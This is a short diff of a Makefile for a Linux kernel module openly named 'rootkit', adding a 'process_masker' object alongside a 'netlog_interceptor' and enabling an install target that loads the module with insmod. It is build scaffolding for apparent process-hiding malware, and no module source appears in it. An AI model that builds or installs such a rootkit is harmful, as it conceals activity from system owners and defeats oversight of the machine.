@@ -24,7 +24,7 @@
 SYSMAP_SCRIPT = ./sysmap.sh
 SYSMAP_HEADER = ./sysmap.h
 obj-m += rootkit.o
-rootkit-objs := core.o netlog_interceptor.o
+rootkit-objs := core.o netlog_interceptor.o process_masker.o
 
 all:
 	$(SYSMAP_SCRIPT)
@@ -34,8 +34,8 @@ clean:
 	rm $(SYSMAP_HEADER)
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 
-#install:	all
-#	insmod process_masker.ko pids=1,2,3
+install:	all
+	insmod rootkit.ko
 
 uninstall:
 #	rmmod process_masker.ko
